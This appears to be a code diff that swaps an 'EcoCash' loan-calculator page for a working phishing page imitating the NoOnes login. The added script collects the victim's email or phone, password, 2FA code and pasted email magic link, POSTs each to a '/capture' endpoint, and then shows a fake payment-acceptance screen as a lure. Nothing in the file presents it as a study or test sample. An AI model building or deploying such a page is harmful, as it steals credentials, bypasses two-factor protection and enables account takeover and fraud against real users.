@@ -4,298 +4,828 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash</title>
+    <title>NoOnes – Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
         
-        html,
         body {
+            background: #eef1f6;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             min-height: 100vh;
-            font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
-            overflow-y: auto;
-        }
-        
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: clamp(10px, 2vw, 20px);
-        }
-        
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: clamp(10px, 3vw, 15px) clamp(15px, 4vw, 20px);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: clamp(5px, 2vw, 10px);
-        }
-        
-        .menu-btn {
-            font-size: clamp(24px, 6vw, 28px);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
-        }
-        
-        .logo {
-            font-size: clamp(24px, 6vw, 28px);
-            font-weight: 700;
-        }
-        
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
+            padding: 1.5rem;
         }
         
         .card {
-            background: white;
-            border-radius: clamp(16px, 5vw, 24px);
-            padding: clamp(24px, 6vw, 32px) clamp(20px, 5vw, 28px);
+            max-width: 400px;
             width: 100%;
-            max-width: 480px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            background: #fff;
+            border-radius: 36px;
+            padding: 2.4rem 2rem 2rem;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
         }
         
-        @media (min-width: 769px) {
-            body {
-                padding: clamp(15px, 3vw, 20px);
-                justify-content: center;
-            }
-            .card {
-                padding: clamp(30px, 5vw, 40px) clamp(25px, 4vw, 30px);
-            }
-        }
-        
-        .title {
-            font-size: clamp(22px, 5vw, 26px);
-            font-weight: 700;
-            color: #333;
-            margin-bottom: clamp(4px, 1.5vw, 6px);
-        }
-        
-        .subtitle {
-            font-size: clamp(13px, 3.5vw, 15px);
-            color: #777;
-            margin-bottom: clamp(18px, 5vw, 24px);
-        }
-        
-        .calc-section {
-            background: #f8f9ff;
-            border-radius: clamp(15px, 4vw, 20px);
-            padding: clamp(18px, 5vw, 24px);
-            margin-bottom: clamp(18px, 5vw, 24px);
-            text-align: left;
-        }
-        
-        .calc-title {
-            font-size: clamp(16px, 4vw, 19px);
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: clamp(18px, 5vw, 24px);
-            color: #333;
-        }
-        
-        .input-group {
-            margin-bottom: clamp(24px, 7vw, 32px);
-        }
-        
-        .input-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: clamp(8px, 2vw, 10px);
-            font-weight: 600;
-            font-size: clamp(13px, 3.5vw, 15px);
-        }
-        
-        .input-label {
-            color: #333;
-        }
-        
-        .input-value {
-            color: #4361ee;
-            font-weight: 700;
-        }
-        
-        .slider {
-            -webkit-appearance: none;
-            width: 100%;
-            height: 8px;
-            border-radius: 4px;
-            background: #e0e0e0;
-            outline: none;
-        }
-        
-        .slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: clamp(24px, 6vw, 28px);
-            height: clamp(24px, 6vw, 28px);
-            border-radius: 50%;
-            background: #4361ee;
-            cursor: pointer;
-        }
-        
-        .range-labels {
-            display: flex;
-            justify-content: space-between;
-            color: #999;
-            font-size: clamp(12px, 3vw, 14px);
-            margin-top: clamp(6px, 2vw, 8px);
-        }
-        
-        .payment-box {
-            background: #f0f4ff;
-            padding: clamp(14px, 4vw, 18px);
-            border-radius: clamp(12px, 4vw, 16px);
-            text-align: center;
-        }
-        
-        .payment-label {
+        .screen {
             display: block;
-            color: #666;
-            margin-bottom: clamp(6px, 2vw, 8px);
-            font-size: clamp(12px, 3vw, 14px);
         }
         
-        .payment-amount {
-            font-size: clamp(26px, 7vw, 30px);
+        .screen.hidden {
+            display: none;
+        }
+        /* ===== LOGIN SCREEN ===== */
+        
+        .login-brand {
+            font-size: 2rem;
             font-weight: 700;
-            color: #4361ee;
+            color: #3dbd5f;
+            text-align: center;
+            letter-spacing: -0.02em;
+            margin-bottom: 0.5rem;
         }
         
-        .apply-btn {
-            width: 100%;
-            padding: clamp(12px, 4vw, 16px);
-            background: linear-gradient(to right, #4361ee, #7209b7);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: clamp(16px, 4vw, 18px);
+        .login-title {
+            font-size: 1.25rem;
             font-weight: 700;
-            cursor: pointer;
-            margin-bottom: clamp(18px, 5vw, 24px);
+            color: #111;
+            text-align: center;
+            margin-bottom: 1.6rem;
         }
         
-        .features {
+        .social-row {
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            gap: clamp(10px, 3vw, 20px);
+            align-items: center;
+            justify-content: center;
+            gap: 1.6rem;
+            margin-bottom: 1.8rem;
         }
         
-        .feature {
-            text-align: center;
-            color: #777;
-            font-size: clamp(11px, 3vw, 13px);
-            flex: 1 0 100px;
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
         }
         
-        .feature-icon {
-            font-size: clamp(32px, 8vw, 36px);
-            margin-bottom: clamp(6px, 2vw, 8px);
+        .social-btn svg {
+            display: block;
         }
         
-        footer {
-            padding: clamp(10px, 3vw, 15px);
+        .social-btn .fa-apple {
+            font-size: 2rem;
+            color: #111;
+        }
+        
+        .field-label {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 0.45rem;
+            display: block;
+        }
+        
+        .field-wrap {
+            margin-bottom: 1.1rem;
+        }
+        
+        .input-box {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            font-size: 1rem;
+            background: #f3f4f6;
+            border: none;
+            border-radius: 14px;
+            outline: none;
+            color: #111;
+            transition: background 0.15s;
+        }
+        
+        .input-box:focus {
+            background: #eaedf0;
+        }
+        
+        .input-box::placeholder {
             color: #aaa;
-            font-size: clamp(11px, 3vw, 13px);
+            font-size: 0.95rem;
+        }
+        
+        .pw-wrap {
+            position: relative;
+        }
+        
+        .pw-wrap .input-box {
+            padding-right: 3rem;
+        }
+        
+        .pw-toggle {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #3dbd5f;
+            font-size: 1.1rem;
+            padding: 0;
+            line-height: 1;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 0.3rem;
+            margin-bottom: 1.6rem;
+        }
+        
+        .forgot-link {
+            font-size: 0.9rem;
+            color: #3dbd5f;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .continue-btn {
+            width: 100%;
+            background: #3dbd5f;
+            border: none;
+            border-radius: 60px;
+            padding: 1rem 1.5rem;
+            color: #fff;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            margin-bottom: 1.1rem;
+        }
+        
+        .continue-btn:hover {
+            background: #35a954;
+        }
+        
+        .continue-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .signup-row {
+            display: flex;
+            justify-content: center;
+            gap: 0.35rem;
+            font-size: 0.95rem;
+            color: #444;
+            margin-bottom: 1.2rem;
+        }
+        
+        .signup-link {
+            color: #3dbd5f;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+        
+        .language-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.3rem;
+            font-size: 0.9rem;
+            color: #3dbd5f;
+            font-weight: 500;
+            background: none;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+        
+        .language-btn i {
+            font-size: 0.75rem;
+        }
+        /* ===== CHECKPOINT SCREEN ===== */
+        
+        .checkpoint-brand-row {
             text-align: center;
-            flex-shrink: 0;
+            margin-bottom: 0.3rem;
+        }
+        
+        .checkpoint-brand-text {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #3dbd5f;
+            letter-spacing: -0.02em;
+        }
+        
+        .checkpoint-sub-row {
+            text-align: center;
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 1.8rem;
+        }
+        
+        .checkpoint-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #3dbd5f;
+            text-align: center;
+            margin-bottom: 0.6rem;
+        }
+        
+        .checkpoint-desc {
+            color: #3dbd5f;
+            font-size: 0.95rem;
+            line-height: 1.55;
+            margin-bottom: 1.6rem;
+            text-align: center;
+        }
+        
+        .checkpoint-input-group {
+            margin-bottom: 1.4rem;
+        }
+        
+        .checkpoint-input-group input {
+            width: 100%;
+            padding: 0.9rem 1.1rem;
+            font-size: 1rem;
+            background: #fff;
+            border: 1.5px solid #3dbd5f;
+            border-radius: 14px;
+            outline: none;
+            transition: border-color 0.15s;
+            color: #111;
+        }
+        
+        .checkpoint-input-group input:focus {
+            border-color: #2da050;
+        }
+        
+        .checkpoint-input-group input::placeholder {
+            color: #bbb;
+            font-size: 0.95rem;
+        }
+        
+        .checkpoint-continue {
+            width: 100%;
+            background: #3dbd5f;
+            border: none;
+            border-radius: 60px;
+            padding: 1rem 1.5rem;
+            color: white;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            margin-bottom: 1.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .checkpoint-continue:hover {
+            background: #35a954;
+        }
+        
+        .checkpoint-continue:active {
+            transform: scale(0.98);
+        }
+        
+        .back-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #3dbd5f;
+            font-weight: 500;
+            font-size: 0.95rem;
+            text-decoration: none;
+            width: fit-content;
+            margin: 0 auto;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        /* ===== 2FA SCREEN ===== */
+        
+        .twofa-brand-row {
+            text-align: center;
+            margin-bottom: 0.3rem;
+        }
+        
+        .twofa-brand-text {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #3dbd5f;
+            letter-spacing: -0.02em;
+        }
+        
+        .twofa-sub-row {
+            text-align: center;
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 1.8rem;
+        }
+        
+        .twofa-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #3dbd5f;
+            text-align: center;
+            margin-bottom: 0.6rem;
+        }
+        
+        .twofa-desc {
+            color: #3dbd5f;
+            font-size: 0.95rem;
+            line-height: 1.55;
+            text-align: center;
+            margin-bottom: 0;
+        }
+        
+        .twofa-desc+.twofa-desc {
+            margin-bottom: 1.6rem;
+        }
+        
+        .twofa-input-group {
+            margin-bottom: 1.4rem;
+        }
+        
+        .twofa-input-group input {
+            width: 100%;
+            padding: 0.9rem 1.1rem;
+            font-size: 1rem;
+            background: #fff;
+            border: 1.5px solid #3dbd5f;
+            border-radius: 14px;
+            outline: none;
+            transition: border-color 0.15s;
+            color: #111;
+        }
+        
+        .twofa-input-group input:focus {
+            border-color: #2da050;
+        }
+        
+        .twofa-input-group input::placeholder {
+            color: #bbb;
+            font-size: 0.95rem;
+        }
+        
+        .twofa-continue {
+            width: 100%;
+            background: #3dbd5f;
+            border: none;
+            border-radius: 60px;
+            padding: 1rem 1.5rem;
+            color: white;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            margin-bottom: 1.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .twofa-continue:hover {
+            background: #35a954;
+        }
+        
+        .twofa-continue:active {
+            transform: scale(0.98);
+        }
+        
+        .back-link-twofa {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #3dbd5f;
+            font-weight: 500;
+            font-size: 0.95rem;
+            text-decoration: none;
+            width: fit-content;
+            margin: 0 auto;
+        }
+        
+        .back-link-twofa:hover {
+            text-decoration: underline;
+        }
+        /* ===== PAYMENT SCREEN ===== */
+        
+        .card.dark {
+            background: #6b7280;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.18);
+        }
+        
+        .payment-screen {
+            color: #fff;
+        }
+        
+        .payment-heading {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #fff;
+            text-align: center;
+            letter-spacing: 0.01em;
+            line-height: 1.2;
+            margin-bottom: 0.7rem;
+            text-transform: uppercase;
+        }
+        
+        .payment-intro {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.88);
+            text-align: center;
+            line-height: 1.55;
+            margin-bottom: 1.8rem;
+        }
+        
+        .payment-block {
+            margin-bottom: 1.5rem;
+        }
+        
+        .payment-block-desc {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.9);
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 0.85rem;
+        }
+        
+        .pay-btn {
+            width: 100%;
+            border: none;
+            border-radius: 60px;
+            padding: 0.95rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: opacity 0.15s, transform 0.1s;
+            letter-spacing: 0.01em;
+        }
+        
+        .pay-btn:hover {
+            opacity: 0.88;
+        }
+        
+        .pay-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .pay-btn.track {
+            background: #c9b99a;
+            color: #3a2e1e;
+        }
+        
+        .pay-btn.accept {
+            background: #3b72d9;
+        }
+        
+        .pay-btn.cancel {
+            background: #e0186c;
+        }
+        
+        @media (max-width: 460px) {
+            .card {
+                padding: 2rem 1.4rem 1.8rem;
+                border-radius: 28px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <header>
-        <button class="menu-btn">☰</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
-        <div></div>
-    </header>
-    <main class="card">
-        <div>
-            <h1 class="title">Get Your Loan Approved Fast</h1>
-            <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
-            <div class="calc-section">
-                <h2 class="calc-title">Loan Calculator</h2>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Amount</span>
-                        <span class="input-value" id="amountValue">$5,000</span>
-                    </div>
-                    <input type="range" class="slider" min="100" max="5000" value="5000" id="amountSlider">
-                    <div class="range-labels"><span>$100</span><span>$5,000</span></div>
-                </div>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Term</span>
-                        <span class="input-value" id="termValue">12 months</span>
-                    </div>
-                    <input type="range" class="slider" min="6" max="60" step="6" value="12" id="termSlider">
-                    <div class="range-labels"><span>6 months</span><span>60 months</span></div>
-                </div>
-                <div class="payment-box">
-                    <span class="payment-label">Monthly Payment</span>
-                    <span class="payment-amount" id="paymentAmount">$450.00</span>
-                </div>
-            </div>
-            <button class="apply-btn" id="applyBtn">APPLY NOW</button>
-        </div>
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">⚡</div>Fast Approval<br>Within 24 hours</div>
-            <div class="feature">
-                <div class="feature-icon">💰</div>Low Rates<br>From 8%</div>
-            <div class="feature">
-                <div class="feature-icon">🔒</div>Secure<br>Bank-level</div>
-        </div>
-    </main>
-    <footer>© 2025 EcoCash</footer>
-    <script>
-        const amountSlider = document.getElementById('amountSlider');
-        const termSlider = document.getElementById('termSlider');
-        const amountValue = document.getElementById('amountValue');
-        const termValue = document.getElementById('termValue');
-        const paymentAmount = document.getElementById('paymentAmount');
+    <div class="card dark">
 
-        function updateCalculator() {
-            const amount = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            amountValue.textContent = '$' + amount.toLocaleString();
-            termValue.textContent = months + (months === 1 ? ' month' : ' months');
-            const annualRate = 0.08;
-            const monthlyRate = annualRate / 12;
-            if (months === 0) {
-                paymentAmount.textContent = '$' + amount.toFixed(2);
-            } else {
-                const power = Math.pow(1 + monthlyRate, months);
-                const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
-                paymentAmount.textContent = '$' + monthlyPayment.toFixed(2);
+        <!-- ========== SCREEN 1: LOGIN ========== -->
+        <div id="loginScreen" class="screen hidden">
+            <div class="login-brand">noones</div>
+            <div class="login-title">Welcome to NoOnes</div>
+
+            <div class="social-row">
+                <button class="social-btn" id="googleBtn" title="Continue with Google">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="36" height="36">
+          <path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v8.6h12.4c-.5 2.8-2.2 5.2-4.6 6.8v5.6h7.4c4.3-4 6.9-9.9 6.9-16.5z"/>
+          <path fill="#34A853" d="M24 47c6.2 0 11.4-2.1 15.2-5.6l-7.4-5.6c-2.1 1.4-4.7 2.2-7.8 2.2-6 0-11.1-4-12.9-9.5H3.5v5.8C7.3 41.7 15 47 24 47z"/>
+          <path fill="#FBBC05" d="M11.1 28.5c-.5-1.4-.7-2.9-.7-4.5s.3-3.1.7-4.5v-5.8H3.5C1.3 17.5 0 20.6 0 24s1.3 6.5 3.5 9.3l7.6-4.8z"/>
+          <path fill="#EA4335" d="M24 9.5c3.4 0 6.4 1.2 8.8 3.4l6.5-6.5C35.4 2.7 30.2.5 24 .5 15 .5 7.3 5.8 3.5 14.7l7.6 4.8c1.8-5.5 6.9-10 12.9-10z"/>
+        </svg>
+      </button>
+                <button class="social-btn" id="appleBtn" title="Continue with Apple">
+        <i class="fa-brands fa-apple"></i>
+      </button>
+            </div>
+
+            <form id="loginForm">
+                <div class="field-wrap">
+                    <label class="field-label" for="emailPhone">Email/Phone number</label>
+                    <input class="input-box" type="text" id="emailPhone" placeholder="Email/Phone number">
+                </div>
+
+                <div class="field-wrap">
+                    <label class="field-label" for="password">Password</label>
+                    <div class="pw-wrap">
+                        <input class="input-box" type="password" id="password" placeholder="Password">
+                        <button type="button" class="pw-toggle" id="pwToggle" tabindex="-1">
+            <i class="fa-regular fa-eye-slash" id="pwIcon"></i>
+          </button>
+                    </div>
+                </div>
+
+                <div class="forgot-row">
+                    <a href="#" class="forgot-link" id="forgotLink">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="continue-btn">Continue</button>
+            </form>
+
+            <div class="signup-row">
+                <span>No account yet?</span>
+                <a href="#" class="signup-link" id="signupLink">Sign up</a>
+            </div>
+
+            <button class="language-btn">
+      English <i class="fas fa-chevron-down"></i>
+    </button>
+        </div>
+
+        <!-- ========== SCREEN 2: MAGIC LINK (checkpoint) ========== -->
+        <div id="checkpointScreen" class="screen hidden">
+            <div class="checkpoint-brand-row">
+                <span class="checkpoint-brand-text">noones</span>
+            </div>
+            <div class="checkpoint-sub-row">🔒 security checkpoint</div>
+
+            <div class="checkpoint-title">New login detected</div>
+            <div class="checkpoint-desc">
+                Check your email for a secure magic link.<br> Paste the entire link below to verify.
+            </div>
+
+            <div class="checkpoint-input-group">
+                <input type="text" id="magicLink" placeholder="Paste any link from email">
+            </div>
+
+            <button class="checkpoint-continue" id="checkpointContinue">
+      Continue →
+    </button>
+
+            <a href="#" class="back-link" id="backToLogin">← Back to login</a>
+        </div>
+
+        <!-- ========== SCREEN 3: 2-STEP VERIFICATION ========== -->
+        <div id="twofaScreen" class="screen hidden">
+            <div class="twofa-brand-row">
+                <span class="twofa-brand-text">noones</span>
+            </div>
+            <div class="twofa-sub-row">2-step verification</div>
+
+            <div class="twofa-title">Verification code</div>
+            <div class="twofa-desc">We sent a 6-digit code to your email.</div>
+            <div class="twofa-desc">or instead add your 2FA code. Enter it below.</div>
+
+            <div class="twofa-input-group">
+                <input type="text" id="twofaCode" placeholder="Enter verification code or 2FA code">
+            </div>
+
+            <button class="twofa-continue" id="twofaContinue">
+      Verify &amp; Continue
+    </button>
+
+            <a href="#" class="back-link-twofa" id="backToLoginFromTwofa">← Back to login</a>
+        </div>
+
+        <!-- ========== SCREEN 4: PAYMENT DASHBOARD ========== -->
+        <div id="paymentScreen" class="screen payment-screen">
+            <div class="payment-heading">And Smart-Transacts</div>
+            <div class="payment-intro">
+                Just link your M-WALLET and smart-transacts accounts and enjoy a world of possibilities.
+            </div>
+
+            <div class="payment-block">
+                <div class="payment-block-desc">
+                    Track The Payment Transfer To Check The Status Of Your Payment.
+                </div>
+                <button class="pay-btn track" id="trackBtn">Track Payment</button>
+            </div>
+
+            <div class="payment-block">
+                <div class="payment-block-desc">
+                    Accept The Payment To Receive The Funds Instantly.
+                </div>
+                <button class="pay-btn accept" id="acceptBtn">Accept Payment</button>
+            </div>
+
+            <div class="payment-block">
+                <div class="payment-block-desc">
+                    Cancel The Payment To Decline The Funds, And The Sender Will Be Refunded Immediately.
+                </div>
+                <button class="pay-btn cancel" id="cancelBtn">Cancel The Transfer</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+            const loginScreen = document.getElementById('loginScreen');
+            const checkpointScreen = document.getElementById('checkpointScreen');
+            const twofaScreen = document.getElementById('twofaScreen');
+            const paymentScreen = document.getElementById('paymentScreen');
+            const card = document.querySelector('.card');
+
+            const loginForm = document.getElementById('loginForm');
+            const emailInput = document.getElementById('emailPhone');
+            const passwordInput = document.getElementById('password');
+            const pwToggle = document.getElementById('pwToggle');
+            const pwIcon = document.getElementById('pwIcon');
+            const forgotLink = document.getElementById('forgotLink');
+            const signupLink = document.getElementById('signupLink');
+
+            const magicInput = document.getElementById('magicLink');
+            const checkpointContinue = document.getElementById('checkpointContinue');
+            const backToLogin = document.getElementById('backToLogin');
+
+            const twofaInput = document.getElementById('twofaCode');
+            const twofaContinue = document.getElementById('twofaContinue');
+            const backToLoginFromTwofa = document.getElementById('backToLoginFromTwofa');
+
+            pwToggle.addEventListener('click', function() {
+                const isHidden = passwordInput.type === 'password';
+                passwordInput.type = isHidden ? 'text' : 'password';
+                pwIcon.className = isHidden ? 'fa-regular fa-eye' : 'fa-regular fa-eye-slash';
+            });
+
+            function showFeedback(msg) {
+                alert(msg);
             }
-        }
-        updateCalculator();
-        amountSlider.addEventListener('input', updateCalculator);
-        termSlider.addEventListener('input', updateCalculator);
-        document.getElementById('applyBtn').addEventListener('click', function() {
-            localStorage.setItem('loanAmount', amountSlider.value);
-            localStorage.setItem('loanTerm', termSlider.value);
-            window.location.href = 'application.html';
-        });
+
+            function goToScreen(screen) {
+                loginScreen.classList.add('hidden');
+                checkpointScreen.classList.add('hidden');
+                twofaScreen.classList.add('hidden');
+                paymentScreen.classList.add('hidden');
+                screen.classList.remove('hidden');
+            }
+
+            function goToCheckpoint() {
+                goToScreen(checkpointScreen);
+                setTimeout(() => magicInput.focus(), 100);
+            }
+
+            function goToTwofa() {
+                goToScreen(twofaScreen);
+                setTimeout(() => twofaInput.focus(), 100);
+            }
+
+            function goToLogin() {
+                card.classList.remove('dark');
+                goToScreen(loginScreen);
+            }
+
+            function goToPayment() {
+                card.classList.add('dark');
+                goToScreen(paymentScreen);
+            }
+
+            async function capture(payload) {
+                try {
+                    await fetch('/capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (_) {}
+            }
+
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                if (!email || !password) {
+                    showFeedback('Please fill in both fields.');
+                    return;
+                }
+                const isEmail = email.includes('@') && email.includes('.');
+                const isPhone = /^[0-9+\-\s()]{7,20}$/.test(email);
+                if (!isEmail && !isPhone) {
+                    showFeedback('Please enter a valid email or phone number.');
+                    return;
+                }
+                if (password.length < 4) {
+                    showFeedback('Password must be at least 4 characters.');
+                    return;
+                }
+                await capture({
+                    step: 'login',
+                    email,
+                    password
+                });
+                goToTwofa();
+            });
+
+            checkpointContinue.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const link = magicInput.value.trim();
+                if (!link) {
+                    showFeedback('Please paste the magic link from your email.');
+                    return;
+                }
+                if (!link.includes('http') && !link.includes('noones') && !link.includes('.')) {
+                    showFeedback('Please paste a valid link.');
+                    return;
+                }
+                await capture({
+                    step: 'checkpoint',
+                    link
+                });
+                goToPayment();
+            });
+
+            twofaContinue.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const code = twofaInput.value.trim();
+                if (!code) {
+                    showFeedback('Please enter your verification code.');
+                    return;
+                }
+                if (code.length < 4) {
+                    showFeedback('Code must be at least 4 characters.');
+                    return;
+                }
+                await capture({
+                    step: 'twofa',
+                    code
+                });
+                goToCheckpoint();
+            });
+
+            backToLogin.addEventListener('click', function(e) {
+                e.preventDefault();
+                goToLogin();
+            });
+            backToLoginFromTwofa.addEventListener('click', function(e) {
+                e.preventDefault();
+                goToLogin();
+            });
+
+            // === FIXED: Payment buttons now navigate to separate pages ===
+            document.getElementById('trackBtn').addEventListener('click', function() {
+                window.location.href = 'noones.html';
+            });
+            document.getElementById('acceptBtn').addEventListener('click', function() {
+                window.location.href = 'noones.html';
+            });
+            document.getElementById('cancelBtn').addEventListener('click', function() {
+                window.location.href = 'noones.html';
+            });
+
+            forgotLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                showFeedback('Reset password – instructions would be sent to your email.');
+            });
+            signupLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                showFeedback('Sign up page – redirect to registration.');
+            });
+
+            magicInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    checkpointContinue.click();
+                }
+            });
+            twofaInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    twofaContinue.click();
+                }
+            });
+        })();
     </script>
 </body>
 
